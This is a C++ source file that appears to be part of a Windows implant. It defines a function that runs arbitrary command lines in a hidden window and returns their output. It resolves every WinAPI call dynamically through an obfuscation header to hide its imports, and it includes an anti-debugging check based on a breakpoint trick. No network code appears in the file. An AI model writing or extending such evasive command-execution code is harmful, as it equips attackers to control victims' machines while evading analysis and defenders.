#include <windows.h>
#include <iostream>
#include <string>
#include "winapi_function_signatures.h"
#include "winapi_obfuscation.h"

namespace {
	std::string GetLastErrorAsString()
	{
		LPSTR messageBuffer = nullptr;
		DWORD errorMsgID = resolve_dynamically<GetLastError_t>("GetLastError")();

		// Ask Win32 to give us the string version of that message ID.
		size_t size = resolve_dynamically<FormatMessageA_t>("FormatMessageA")(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, errorMsgID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

		// Copy the error message into a std::string.
		std::string message(messageBuffer, size);

		resolve_dynamically<LocalFree_t>("LocalFree")(messageBuffer);

		return message;
	}

	void createChildProc(HANDLE stdOutRead, HANDLE stdOutWrite, std::string command)
	{
		PROCESS_INFORMATION procInfo;
		STARTUPINFOA startInfo;

		memset(&procInfo, 0, sizeof(procInfo));
		memset(&startInfo, 0, sizeof(startInfo));

		startInfo.cb = sizeof(STARTUPINFO);
		startInfo.hStdError = stdOutWrite;
		startInfo.hStdOutput = stdOutWrite;
		startInfo.hStdInput = stdOutRead;
		startInfo.dwFlags |= STARTF_USESTDHANDLES;

		// Create the child process and run the command line
		if (!resolve_dynamically<CreateProcessA_t>("CreateProcessA")(NULL, (char*)command.c_str(), NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo))
			throw std::runtime_error(GetLastErrorAsString());

		resolve_dynamically<CloseHandle_t>("CloseHandle")(procInfo.hProcess);
		resolve_dynamically<CloseHandle_t>("CloseHandle")(procInfo.hThread);
		resolve_dynamically<CloseHandle_t>("CloseHandle")(stdOutWrite);
	}
}

std::string exec(std::string command)
{
	SECURITY_ATTRIBUTES securityAttr;

	HANDLE stdOutWrite = nullptr;
	HANDLE stdOutRead = nullptr;

	memset(&securityAttr, 0, sizeof(securityAttr));
	securityAttr.nLength = sizeof(securityAttr);
	securityAttr.bInheritHandle = true;
	securityAttr.lpSecurityDescriptor = NULL;

	// Create an STDOUT Pipe for the child process
	if (!resolve_dynamically<CreatePipe_t>("CreatePipe")(&stdOutRead, &stdOutWrite, &securityAttr, 0)) {
		return "Error - CreatePipe() failed: " + GetLastErrorAsString();
	}

	if (!resolve_dynamically<SetHandleInformation_t>("SetHandleInformation")(stdOutRead, HANDLE_FLAG_INHERIT, 0)) {
		return "Error - SetHandleInformation() failed: " + GetLastErrorAsString();
	}

	// Create the child process
	try {
		createChildProc(stdOutRead, stdOutWrite, command);
	}
	catch (const std::runtime_error& e) {
		return e.what();
	}
	
	// Read from the child process STDOUT Pipe
	DWORD bytesRead = 0;
	char buf[4096];
	std::string commandResult = "";

	memset(buf, 0, sizeof(buf));
	while (resolve_dynamically<ReadFile_t>("ReadFile")(stdOutRead, buf, sizeof(buf), &bytesRead, NULL) && bytesRead != 0) // while there are still bytes to read
		commandResult.append(buf, bytesRead);

	resolve_dynamically<CloseHandle_t>("CloseHandle")(stdOutRead);

	// Return the result from STDOUT
	return commandResult;
}

bool isDebuggerAttached()
{
	__try
	{
		__debugbreak();  // Trigger breakpoint exception
		return true;  // If this line runs, a debugger caught the exception
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;  // Exception caught by SEH - no debugger
	}
}